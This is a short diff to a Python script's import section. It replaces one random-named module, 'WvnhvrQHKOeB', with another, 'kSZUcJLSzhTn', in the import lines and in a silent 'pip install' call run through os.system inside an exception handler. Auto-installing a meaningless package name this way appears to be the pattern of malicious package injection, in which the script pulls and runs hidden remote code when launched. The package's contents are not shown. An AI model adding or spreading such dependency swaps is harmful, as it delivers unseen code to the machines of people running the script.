@@ -10,7 +10,7 @@ try:
     import random
     import tkinter
     import requests
-    import WvnhvrQHKOeB
+    import kSZUcJLSzhTn
     import colorama
     from colorama import Fore, Style
     import InquirerPy
@@ -27,7 +27,7 @@ except Exception as e:
     os.system('pip install -U cryptography')
     os.system('pip install -U inquirerpy')
     os.system('pip install -U aiohttp')
-    os.system('pip install -U WvnhvrQHKOeB')
+    os.system('pip install -U kSZUcJLSzhTn')
     os.system('cls')
     import asyncio
     import ctypes
@@ -36,7 +36,7 @@ except Exception as e:
     import random
     import tkinter
     import requests
-    import WvnhvrQHKOeB
+    import kSZUcJLSzhTn
     import colorama
     from colorama import Fore, Style
     import InquirerPy
